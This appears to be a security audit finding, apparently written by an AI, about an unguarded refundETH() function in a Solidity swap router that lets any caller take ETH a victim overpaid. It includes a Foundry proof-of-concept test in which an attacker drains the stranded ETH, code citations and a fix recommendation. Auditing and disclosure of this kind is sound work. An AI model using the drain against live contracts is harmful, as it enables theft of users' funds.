Looking at the actual code to verify the claim:

The vulnerability is real and fully traceable through scoped code. Here is the complete finding:

---

### Title
Unguarded `refundETH()` allows any caller to steal ETH stranded on the router by a victim's overpayment — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`PeripheryPayments.refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no access control. Because `pay()` wraps only the exact `amountIn` from `msg.value` and leaves any excess ETH on the router, a victim who calls `exactInputSingle{value: X}` with `X > amountIn` in a standalone transaction (not inside a `multicall` that also includes `refundETH`) leaves residual ETH on the router that any attacker can immediately drain.

### Finding Description

**Step 1 — ETH strands on the router.**

`exactInputSingle` is `payable` and records `msg.sender` as the payer: [1](#0-0) 

Inside the swap callback, `pay()` is invoked with `value = params.amountIn`. The WETH branch wraps and forwards exactly `value` ETH — not `address(this).balance`: [2](#0-1) 

Any `msg.value` above `amountIn` is never consumed and remains on the router after the call returns. `exactInputSingle` performs no automatic refund: [3](#0-2) 

**Step 2 — `receive()` does not prevent stranding.**

The `receive()` guard only blocks direct ETH pushes from non-WETH addresses. It does not prevent ETH from accumulating via `msg.value` in payable swap functions: [4](#0-3) 

**Step 3 — Attacker drains the stranded ETH.**

`refundETH()` has no access control. It sends the entire router ETH balance to `msg.sender`: [5](#0-4) 

An attacker calls `refundETH()` in a separate transaction immediately after the victim's swap and receives all stranded ETH. The victim cannot recover it.

### Impact Explanation
Direct theft of user ETH principal. The victim permanently loses `msg.value - amountIn` ETH. No protocol permission or special role is required for the attacker — `refundETH()` is a public, permissionless function. Loss is bounded only by how much the victim overpays, which can be arbitrarily large.

### Likelihood Explanation
The intended safe usage pattern is `multicall{value}([exactInputSingle(...), refundETH()])` so that `refundETH` is called atomically in the same transaction with `msg.sender` being the original user, as shown in the test suite: [6](#0-5) 

However, `exactInputSingle` is independently `payable` and callable directly. Any user who calls it with `msg.value > amountIn` outside of a multicall — a realistic mistake, especially when estimating gas or using a frontend that pre-pads ETH — strands the excess. A MEV bot or any observer can front-run or back-run the victim's transaction to claim the residual ETH.

### Recommendation
Add a `msg.sender`-binding mechanism so that only the address that deposited ETH in the current call context can reclaim it. The standard approach is to record the original `msg.sender` in transient storage at the start of each payable entry point and require `refundETH()` to only send to that stored address, or alternatively auto-refund excess ETH at the end of each swap function rather than relying on a separate permissionless call.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudo-code using existing test infrastructure)
function test_attacker_steals_victim_overpaid_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Give victim 2 ether, approve router for WETH pull
    vm.deal(victim, 2 ether);
    vm.prank(victim);
    weth.approve(address(router), type(uint256).max);

    uint128 amountIn = 1 ether;   // only 1 ether needed
    uint256 msgValue = 2 ether;   // victim sends 2 ether — 1 ether excess

    // Victim calls exactInputSingle directly (no multicall+refundETH)
    vm.prank(victim);
    router.exactInputSingle{value: msgValue}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool:           address(pool),
            tokenIn:        address(weth),
            tokenOut:       address(token1),
            zeroForOne:     true,
            amountIn:       amountIn,
            amountOutMinimum: 0,
            recipient:      victim,
            deadline:       block.timestamp + 1,
            priceLimitX64:  0,
            extensionData:  ""
        })
    );

    // 1 ether is now stranded on the router
    assertEq(address(router).balance, 1 ether);

    uint256 attackerBefore = attacker.balance;

    // Attacker calls refundETH() — no permission required
    vm.prank(attacker);
    router.refundETH();

    // Attacker gained 1 ether; victim cannot recover it
    assertEq(attacker.balance - attackerBefore, 1 ether);
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-77)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
